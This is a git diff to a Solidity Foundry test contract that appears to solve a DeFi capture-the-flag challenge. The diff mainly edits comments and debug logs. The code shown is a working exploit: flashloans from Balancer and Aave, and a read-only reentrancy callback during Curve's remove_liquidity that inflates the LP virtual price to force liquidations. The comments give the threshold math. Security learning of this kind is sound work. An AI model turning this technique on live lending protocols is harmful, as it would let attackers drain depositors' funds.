@@ -203,6 +203,7 @@ contract Rescuer is Test{
 
     // Find pool address from https://aave.com/docs/resources/addresses, choose v2 pool!
     address constant aavePool = 0x7d2768dE32b0b80b7a3454c06BdAc94A69DDc7A9;
+    // Balancer pool has no fee, this is to reduce the flashloan cost
     address constant balancerPool = 0xBA12222222228d8Ba445958a75a0704d566BF2C8;
     address immutable player;
     address immutable treasury;
@@ -224,19 +225,6 @@ contract Rescuer is Test{
             users.push(_users[i]);
         }
 
-        // Logs:
-        //   CurvePool eth balance 34543361925271962711040
-        //   CurvePool stETH balance 35548937793868475091973
-        //   CurvePool balances[0]: 34543279685479012272346
-        //   CurvePool balances[1]: 35548870433002420435140
-        //   CurvePool LP token supply 63900743099782364043112
-        //   CurvePool LP token price 1096890440129560193
-
-        //   Collateral value: 25000000000000000000000
-        //   Borrow value: 4387561760518240772000
-        //   =>
-        //   To trigger liquidation, the borrowed asset price must increase by at least this amount:
-        //   25000000000000000000000 / 4387561760518240772000 / 1.75 = 3.2559574236117226 // See 1.75 is from CurvyPuppetLending.liquidate
 
         //   AAVE Pool WETH balance 0
         //   AAVE Pool stETH balance 0
@@ -402,7 +390,8 @@ contract Rescuer is Test{
 
         trigger = true;
         uint256 lpTokenBalance = IERC20(curvePool.lp_token()).balanceOf(address(this));
-        uint256[2] memory withdrawn  = curvePool.remove_liquidity(lpTokenBalance - 6 ether, [uint256(0), uint256(0)]); // Keep some LP token, 3 ether, enough to repay during CurvyPuppetLending liquidating
+        // Need 3 LP token to liquidate CurvyPuppetLending. Another few extra to send to treasure to pass the test
+        uint256[2] memory withdrawn  = curvePool.remove_liquidity(lpTokenBalance - 6 ether, [uint256(0), uint256(0)]);
         trigger = false;
 
         // Repay balancer
@@ -416,20 +405,18 @@ contract Rescuer is Test{
             0 // min amount out
         );
 
-        // Get back ETH from extra stETH
+        // Get back ETH from extra stETH since treasury want WETH in the end
         uint256 extraStETH = stETH.balanceOf(address(this)) - stETHAmountToRepay;
         curvePool.exchange(1, 0, extraStETH, 0);
 
         weth.deposit{value: address(this).balance}();
 
+        // Repay balancer
         weth.transfer(balancerPool, amount + premium);
         balancerPool.call(abi.encodeWithSignature("settle(address,uint256)",
                                                   address(weth),
                                                   amount + premium));
 
-        console.log("LP token balance:" , IERC20(curvePool.lp_token()).balanceOf(address(this)));
-        console.log("stETH balance left ", stETH.balanceOf(address(this)));
-        console.log("weth balance left ", weth.balanceOf(address(this)));
 
         // Transfer weth, lptoken, dvt left to treasury
         weth.transfer(treasury, weth.balanceOf(address(this)) - (wethAmountToRepay - amount + premium));
@@ -441,6 +428,12 @@ contract Rescuer is Test{
         if (!trigger){
             return;
         }
+
+        //   Collateral value: 25000000000000000000000
+        //   Borrow value: 4387561760518240772000
+        //   Liquidation collateral/borrow threashold set in CurvyPuppetLending: 1.75
+        //   To trigger liquidation, the virtual price must be inflated at least 3.2559574236117226 times
+        //   25000000000000000000000 / 4387561760518240772000 / 1.75 = 3.2559574236117226
         // Must be triggered by the remove_liquidty callback, ie. bad state only occurs inside remove_liquidity function
         console.log("LP token price in the middle of removing liquidity: ", curvePool.get_virtual_price());
 
@@ -450,9 +443,9 @@ contract Rescuer is Test{
     }
 }
 
-// What i leant:
+// What can be learnt:
 // - Trial and error to get the max value in lending pool
-// - Do some math to get the expected ratio which can tirgger the liquidity
+// - Do some math to get the expected ratio which can trigger the liquidity
 // - Place the callback right with the bad state occurs
 // - Balancer has free flashloan
 // - Uniswap is a last resort, it is fee is high compared to flashloans
